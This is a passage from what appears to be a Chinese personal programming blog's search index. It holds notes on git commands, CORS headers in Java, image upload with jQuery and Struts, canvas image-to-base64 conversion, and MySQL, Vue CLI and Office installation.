显示某个文件的版本历史，包括文件改名$ git log --follow [file]$ git whatchanged [file]# 显示指定文件相关的每一次diff$ git log -p [file]# 显示过去5次提交$ git log -5 --pretty --oneline# 显示所有提交过的用户，按提交次数排序$ git shortlog -sn# 显示指定文件是什么人在什么时间修改过$ git blame [file]# 显示暂存区和工作区的差异$ git diff# 显示暂存区和上一个commit的差异$ git diff --cached [file]# 显示工作区与当前分支最新commit之间的差异$ git diff HEAD# 显示两次提交之间的差异$ git diff [first-branch]...[second-branch]# 显示今天你写了多少行代码$ git diff --shortstat &quot;@{0 day ago}&quot;# 显示某次提交的元数据和内容变化$ git show [commit]# 显示某次提交发生变化的文件$ git show --name-only [commit]# 显示某次提交时，某个文件的内容$ git show [commit]:[filename]# 显示当前分支的最近几次提交$ git reflog</code></pre><h4 id="八、远程同步"><a href="#八、远程同步" class="headerlink" title="八、远程同步"></a>八、远程同步</h4><pre><code># 下载远程仓库的所有变动$ git fetch [remote]# 显示所有远程仓库$ git remote -v# 显示某个远程仓库的信息$ git remote show [remote]# 增加一个新的远程仓库，并命名$ git remote add [shortname] [url]# 取回远程仓库的变化，并与本地分支合并$ git pull [remote] [branch]# fatal: refusing to merge unrelated histories异常解决，解决冲突$ git pull$ git pull origin master$ git pull [remote] [branch] --allow-unrelated-histories$ git push -u origin master -f# 上传本地指定分支到远程仓库$ git push [remote] [branch]# 强行推送当前分支到远程仓库，即使有冲突$ git push [remote] --force# 推送所有分支到远程仓库$ git push [remote] --all</code></pre><h4 id="九、撤销"><a href="#九、撤销" class="headerlink" title="九、撤销"></a>九、撤销</h4><pre><code># 恢复暂存区的指定文件到工作区$ git checkout [file]# 恢复某个commit的指定文件到暂存区和工作区$ git checkout [commit] [file]# 恢复暂存区的所有文件到工作区$ git checkout .# 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变$ git reset [file]# 重置暂存区与工作区，与上一次commit保持一致$ git reset --hard# 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变$ git reset [commit]# 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致$ git reset --hard [commit]# 重置当前HEAD为指定commit，但保持暂存区和工作区不变$ git reset --keep [commit]# 新建一个commit，用来撤销指定commit# 后者的所有变化都将被前者抵消，并且应用到当前分支$ git revert [commit]# 暂时将未提交的变化移除，稍后再移入$ git stash$ git stash pop</code></pre><h4 id="十、关于-gitignore文件"><a href="#十、关于-gitignore文件" class="headerlink" title="十、关于.gitignore文件"></a>十、关于.gitignore文件</h4><pre><code># 配置.gitignore文件(新建/编辑）$ echo &#39;.idea&#39; &gt;&gt; .gitignore# 常用的.gitignore文件简短配置.project.settings/.prefs.pydevproject.idea/.idea.DS_Store.cache*.pyc*.html*.xlm*.iml</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>跨域请求</title>
      <link href="/2020/04/15/kua-yu-qing-qiu/"/>
      <url>/2020/04/15/kua-yu-qing-qiu/</url>
      
        <content type="html"><![CDATA[<h2 id="一、后端处理"><a href="#一、后端处理" class="headerlink" title="一、后端处理"></a>一、后端处理</h2><pre><code>public HttpServletResponse getResponse(Map&lt;String,Object&gt; map) throws IOException {        if (null == response) {            String respBody = JSON.toJSONString(map);            response = ServletActionContext.getResponse();            response.setContentType(SystemContext.ACTION_CONTENT_TYPE);            response.setHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;);            response.setHeader(&quot;Cache-Control&quot;, &quot;no-cache&quot;);            response.addHeader(&quot;Access-Control-Allow-Meaders&quot;,&quot;POST&quot;);//请求格式            response.addHeader(&quot;Access-Control-Allow-Headers&quot;,&quot;x-requested-with,content-type&quot;);//响应头            //PrintWriter out = response.getWriter();//输出流            //out.print(respBody);            //out.flush();            //out.close();        }        return response;    }</code></pre><h2 id="二、调用方法"><a href="#二、调用方法" class="headerlink" title="二、调用方法"></a>二、调用方法</h2><pre><code>data = JsonBean.success(&quot;suceess&quot;,pageResult);BaseAction base = new BaseAction();base.getResponse(data);</code></pre>]]></content>
      
      
      <categories>
          
          <category> 常用方法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 跨域请求 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图片上传</title>
      <link href="/2020/04/15/tu-pian-shang-chuan/"/>
      <url>/2020/04/15/tu-pian-shang-chuan/</url>
      
        <content type="html"><![CDATA[<h2 id="一、在form中写入属性enctype-“multipart-form-data”"><a href="#一、在form中写入属性enctype-“multipart-form-data”" class="headerlink" title="一、在form中写入属性enctype = “multipart/form-data”"></a>一、在form中写入属性enctype = “multipart/form-data”</h2><h4 id="1-用以设置表单的MIME编码，默认情况，这个编码格式是application-x-www-form-urlencoded，不能用于文件上传；只有使用了multipart-form-data，才能完整的传递文件数据，完成图片的上传。"><a href="#1-用以设置表单的MIME编码，默认情况，这个编码格式是application-x-www-form-urlencoded，不能用于文件上传；只有使用了multipart-form-data，才能完整的传递文件数据，完成图片的上传。" class="headerlink" title="1.用以设置表单的MIME编码，默认情况，这个编码格式是application/x-www-form-urlencoded，不能用于文件上传；只有使用了multipart/form-data，才能完整的传递文件数据，完成图片的上传。"></a>1.用以设置表单的<a href="https://www.baidu.com/s?wd=MIME&tn=44039180_cpr&fenlei=mv6quAkxTZn0IZRqIHckPjm4nH00T1dBPWKWuhRvPynsnHubnARk0ZwV5Hcvrjm3rH6sPfKWUMw85HfYnjn4nH6sgvPsT6KdThsqpZwYTjCEQLGCpyw9Uz4Bmy-bIi4WUvYETgN-TLwGUv3EPHTknW01r0" target="_blank" rel="noopener">MIME</a>编码，默认情况，这个编码格式是application/x-www-form-urlencoded，不能用于文件上传；只有使用了multipart/form-data，才能完整的传递文件数据，完成图片的上传。</h4><pre><code>&lt;form id=&quot;showDataForm&quot; class=&quot;layui-form&quot; enctype=&quot;multipart/form-data&quot; onsubmit=&quot;return PostData()&quot;&gt;</code></pre><h2 id="二、用ajax提交"><a href="#二、用ajax提交" class="headerlink" title="二、用ajax提交"></a>二、用ajax提交</h2><pre><code>$.ajax({                type: &quot;POST&quot;,                url: &#39;&#39;,                data: formData,                timeout: 6000,                async: false,                cache: false,                contentType: false,                processData: false,                success: function (msg) {                    setTimeout(function () {                        $(&quot;#scbtn&quot;).attr(&quot;disabled&quot;, false);//将提交按钮解除为可点击                        layer.msg(&#39;提交成功&#39;, {                            time: 1000                        }, function () {                            window.location.href = &quot;xx.html&quot;;                        });                    },1000);                },                error: function (msg) {                    layer.msg(&#39;提交超时，请检查您的网络连接！&#39;);                    $(&quot;#scbtn&quot;).attr(&quot;disabled&quot;, false);                }            });            return false;</code></pre><h2 id="3、后台接收代码"><a href="#3、后台接收代码" class="headerlink" title="3、后台接收代码"></a>3、后台接收代码</h2><pre><code>private File file;//与前端name一致private String fileFileName;//接收的名字    public File getFile() {        return file;    }    public void setFile(File file) {        this.file = file;    }    public String getFileFileName() {        return fileFileName;    }    public void setFileFileName(String fileFileName) {        this.fileFileName = fileFileName;    }</code></pre><pre><code>    public static int getSecondTimestamp(Date date){//将上传的图片名字改为yy-mm-dd格式        if (null == date) {            return 0;        }        String timestamp = String.valueOf(date.getTime());        int length = timestamp.length();        if (length &gt; 3) {            return Integer.valueOf(timestamp.substring(0,length-3));        } else {            return 0;        }    }</code></pre><pre><code>    public String add() throws Exception {        Date date=new Date();        if(file != null){            String path = ServletActionContext.getServletContext().getRealPath(&quot;/upload&quot;);//服务器项目根路径            File filePath = new File(path);            if(!filePath.exists()){                filePath.mkdir();            }            String format = fileFileName.split(&quot;\\.&quot;)[1];            File diskFile = new File(path + File.separator                    + String.valueOf(getSecondTimestamp(date))+&quot;.&quot;+format);            FileUtils.copyFile(file, diskFile);            casCase.setFurImage(String.valueOf(getSecondTimestamp(date))+&quot;.&quot;+format);//图片名字        }    }</code></pre>]]></content>
      
      
      <categories>
          
          <category> 常用方法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后端 </tag>
            
            <tag> 上传 </tag>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二进制转化</title>
      <link href="/2020/04/15/er-jin-zhi-zhuan-hua/"/>
      <url>/2020/04/15/er-jin-zhi-zhuan-hua/</url>
      
        <content type="html"><![CDATA[<h2 id="一、网页代码"><a href="#一、网页代码" class="headerlink" title="一、网页代码"></a>一、网页代码</h2><pre><code>&lt;input type=&quot;file&quot; name=&quot;&quot; id=&quot;&quot; onchange=&quot;tobin(this)&quot; value=&quot;&quot;&gt;&lt;img src=&quot;&quot; id=&quot;you&quot; width=&quot;320px&quot;&gt;&lt;div style=&quot;position: absolute;z-index: -1;width: 0px;height: 0px;overflow: hidden;&quot;&gt;    &lt;canvas id=&quot;can&quot; width=&quot;320px&quot; height=&quot;240px&quot;&gt;&lt;/canvas&gt;&lt;/div&gt;</code></pre><h2 id="二、js代码"><a href="#二、js代码" class="headerlink" title="二、js代码"></a>二、js代码</h2><pre><code>function tobin(target) {    //获取临时缓存图片的路径，并传递给“显示图片”    var url = window.URL.createObjectURL(target.files.item(0));    //制造一张图片，传入画布，让它在画布中画出来。    var img1 = new Image();    img1.src = url;    //初始化捕捉元素    var can = document.getElementById(&#39;can&#39;);    //var you = document.getElementById(&#39;you&#39;);    var context = can.getContext(&quot;2d&quot;);    //当图片制造完成后，执行函数    img1.onload = function() {        //因为canvas输出的二进制图片会根据当前canvas的大小而变形，所以要将图片原始尺寸取出，然后传递给canvas,这样就能保证输出的图片原始比例不变        var nw = img1.naturalWidth;        var nh = img1.naturalHeight;        can.setAttribute(&#39;width&#39;, nw + &#39;px&#39;)        can.setAttribute(&#39;height&#39;, nh + &#39;px&#39;)        //图片原始比例        console.log(nw, nh);        //绘制进canvas        context.drawImage(img1, 0, 0, nw, nh);        //二进制流转化函数        var bin = can.toDataURL(&quot;image/jpeg&quot;); //bin值已经存放了二进制流        //二进制流传入“显示图片”        you.src = bin;    }}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 常用方法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> base6 </tag>
            
            <tag> 图片二进制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql安装</title>
      <link href="/2020/03/30/mysql-an-zhuang/"/>
      <url>/2020/03/30/mysql-an-zhuang/</url>
      
        <content type="html"><![CDATA[<h2 id="一、创建my-ini文件"><a href="#一、创建my-ini文件" class="headerlink" title="一、创建my.ini文件"></a>一、创建my.ini文件</h2><h4 id="1-在解压的根目录创建my-ini文件，并放入下面代码"><a href="#1-在解压的根目录创建my-ini文件，并放入下面代码" class="headerlink" title="1.在解压的根目录创建my.ini文件，并放入下面代码"></a>1.在解压的根目录创建my.ini文件，并放入下面代码</h4><pre><code>[mysql]# 设置mysql客户端默认字符集default-character-set=utf8[mysqld]# 设置3306端口port=3306# 设置mysql的安装目录basedir=D:\mysql-8.0.13-winx64# 设置mysql数据库的数据的存放目录datadir=D:\mysql-8.0.13-winx64\data# 允许最大连接数max_connections=200# 服务端使用的字符集默认为8比特编码的latin1字符集character-set-server=utf8# 创建新表时将使用的默认存储引擎default-storage-engine=INNODB# 默认使用“mysql_native_password”插件认证default_authentication_plugin=mysql_native_password</code></pre><h2 id="二、执行安装"><a href="#二、执行安装" class="headerlink" title="二、执行安装"></a>二、执行安装</h2><h4 id="1-进入解压的跟目录，管理员执行，当根目录有新增文件则表明成功"><a href="#1-进入解压的跟目录，管理员执行，当根目录有新增文件则表明成功" class="headerlink" title="1.进入解压的跟目录，管理员执行，当根目录有新增文件则表明成功"></a>1.进入解压的跟目录，管理员执行，当根目录有新增文件则表明成功</h4><pre><code>bin\mysqld --installbin\mysqld --initialize-insecure</code></pre><h4 id="2-重启cmd，一定要重启，并启动服务"><a href="#2-重启cmd，一定要重启，并启动服务" class="headerlink" title="2.重启cmd，一定要重启，并启动服务"></a>2.重启cmd，一定要重启，并启动服务</h4><pre><code>net start mysql</code></pre><h4 id="3-启动服务后，输入"><a href="#3-启动服务后，输入" class="headerlink" title="3.启动服务后，输入"></a>3.启动服务后，输入</h4><pre><code>mysql -uroot -p</code></pre><p>初次安装密码为空，直接回车即可</p><h4 id="4-常用代码"><a href="#4-常用代码" class="headerlink" title="4.常用代码"></a>4.常用代码</h4><pre><code>mysqld --initialize --console//查看原始密码一般为0或空 ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED WITH mysql_native_password BY &#39;你的密码&#39;;  //修改密码</code></pre>]]></content>
      
      
      <categories>
          
          <category> 软件安装 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue脚手架安装</title>
      <link href="/2020/03/25/vue-jiao-shou-jia-an-zhuang/"/>
      <url>/2020/03/25/vue-jiao-shou-jia-an-zhuang/</url>
      
        <content type="html"><![CDATA[<h1 id="vue脚手架安装及路径修改"><a href="#vue脚手架安装及路径修改" class="headerlink" title="vue脚手架安装及路径修改"></a>vue脚手架安装及路径修改</h1><h3 id="一、安装node-js"><a href="#一、安装node-js" class="headerlink" title="一、安装node.js"></a>一、安装node.js</h3><p>例如我的安装路径为：D:\tool\nodejs；</p><p>node -v    检查当前node的版本；</p><p>npm -v    检查当前npm的版本;</p><p>有版本信息输出则为安装成功。</p><h3 id="二、修改node-global和node-cache资源路径"><a href="#二、修改node-global和node-cache资源路径" class="headerlink" title="二、修改node_global和node_cache资源路径"></a>二、修改node_global和node_cache资源路径</h3><p>修改node_global和node_cache资源路径的目的是防止默认安装在C盘,分别执行以下代码</p><pre><code>npm config set prefix &quot;D:\tool\nodejs\node_global&quot;npm config set cache &quot;D:\tool\nodejs\node_cache&quot;</code></pre><h3 id="三、安装淘宝镜像"><a href="#三、安装淘宝镜像" class="headerlink" title="三、安装淘宝镜像"></a>三、安装淘宝镜像</h3><p>默认下载路径比较慢，安装淘宝镜像可加快下载速度，运行以下代码</p><pre><code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code></pre><p>安装成功后输入 npm config list 查询已安装信息，npm config get registry 检查一下镜像站是否切换为淘宝镜像命令，部分人安装后却发现镜像并未更改，这时候需要修改C:\Users\Administrator.npmrc目录的文件以永久使用淘宝镜像，在文件中添加</p><pre><code>registry=http://registry.npm.taobao.org</code></pre><h3 id="四、全局安装vue脚手架"><a href="#四、全局安装vue脚手架" class="headerlink" title="四、全局安装vue脚手架"></a>四、全局安装vue脚手架</h3><p>分别执行以下代码，webpack为打包</p><pre><code>npm install -g @vue/cli//全局安装脚手架npm i webpack@3.12.0 -g//全局安装webpage3.12.0稳定版</code></pre><p>有部分人安装可能会出现错误，可能是由于npm版本过低，解决方法执行</p><pre><code>npm install npm -g//检查npm安装或更新命令（可不操作）</code></pre><p>更新成功后再执行上面代码</p><h3 id="五、配置环境变量"><a href="#五、配置环境变量" class="headerlink" title="五、配置环境变量"></a>五、配置环境变量</h3><p>1.重启cmd，一定要重启，不然看不到版本信息，反正我安装后是这样；</p><p>2.当执行前面操作后vue脚手架已安装成功，下面是版本或帮助信息</p><pre><code>vue   ## 查看 vue 相关帮助信息vue --version 或 vue -V  ## 查看安装的 vue cli 版本信息</code></pre><p>3、执行后有版本信息输出则说明vue脚手架安装成功，到这里有些人会遇到不是内部或外部命令，也不是可运行的程序或批处理文件的提示，这是因为你已经把node_global和node_cache资源路径修改到了D盘，默认为C盘当然会提示不是指令啦，解决方法</p><pre><code>D:\tool\nodejs\node_global//在电脑环境变量的path下新加D:\tool\nodejs\node_global\node_modules//新建NODE_PATH加入</code></pre><p>4、在执行重新执行你会发现已经成功了！</p>]]></content>
      
      
      <categories>
          
          <category> 软件安装 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>office安装</title>
      <link href="/2020/03/25/office-an-zhuang/"/>
      <url>/2020/03/25/office-an-zhuang/</url>
      
        <content type="html"><![CDATA[<h1 id="解决office自定义安装问题"><a href="#解决office自定义安装问题" class="headerlink" title="解决office自定义安装问题"></a>解决office自定义安装问题</h1><p>当我们需要安装office时，office默认会帮我们安装其所有功能，比如Access、OneNote等，但我们有时只想安装其中的Word、Excel、PowerPoint，那需要怎么做呢？</p><h3 id="一、安装DAEMON-Tools-Lite"><a href="#一、安装DAEMON-Tools-Lite" class="headerlink" title="一、安装DAEMON Tools Lite"></a>一、安装DAEMON Tools Lite</h3><p><a href="https://daemon-tools-lite.en.softonic.com/download" target="_blank" rel="noopener">daemon tools</a>是一个的虚拟光驱工具，当安装office时会用到，安装完成后将office加载进来，比如我加载后的盘符为G盘。</p><h3 id="二、安装微软官方管理器office-deployment-tool"><a href="#二、安装微软官方管理器office-deployment-tool" class="headerlink" title="二、安装微软官方管理器office deployment tool"></a>二、安装微软官方管理器office deployment tool</h3><p>下载 <a href="https://www.microsoft.com/en-us/download/confirmation.aspx?id=49117" target="_blank" rel="noopener">Office 部署工具</a>后，双击 Officedeploymenttool 执行 (.exe) 文件以解压缩 ODT  文件。完成后，解压到的文件夹中应该有多个文件： setup.exe 和一些示例 configuration.xml  文件，而我们真正需要的是configuration-Office365-x64.xml这个文件。</p><h3 id="三、修改configuration-Office365-x64-xml文件"><a href="#三、修改configuration-Office365-x64-xml文件" class="headerlink" title="三、修改configuration-Office365-x64.xml文件"></a>三、修改configuration-Office365-x64.xml文件</h3><pre><code>&lt;Configuration&gt;  &lt;Add SourcePath=&quot;G:\&quot; OfficeClientEdition=&quot;64&quot; &gt;  //G为虚拟镜像位置,daemon tools加载office的盘符    &lt;Product ID=&quot;ProPlusRetail&quot;&gt;        &lt;Language ID=&quot;zh-CN&quot; /&gt;//选择语言        &lt;ExcludeApp ID=&quot;Access&quot; /&gt;        &lt;ExcludeApp ID=&quot;Groove&quot; /&gt;        &lt;ExcludeApp ID=&quot;InfoPath&quot; /&gt;        &lt;ExcludeApp ID=&quot;Lync&quot; /&gt;        &lt;ExcludeApp ID=&quot;OneNote&quot; /&gt;        &lt;ExcludeApp ID=&quot;Outlook&quot; /&gt;        &lt;ExcludeApp ID=&quot;Publisher&quot; /&gt;        &lt;ExcludeApp ID=&quot;SharePointDesigner&quot; /&gt;    &lt;/Product&gt;  &lt;/Add&gt;  &lt;/Configuration&gt;</code></pre><h3 id="四、运行"><a href="#四、运行" class="headerlink" title="四、运行"></a>四、运行</h3><p>启动管理员cmd（进入 office deployment tool的解压路径），输入</p><pre><code>setup.exe /configure configuration-Office365-x64.xml</code></pre><p>等待office安装完成就可以了。</p>]]></content>
      
      
      <categories>
          
          <category> 软件安装 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> office </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
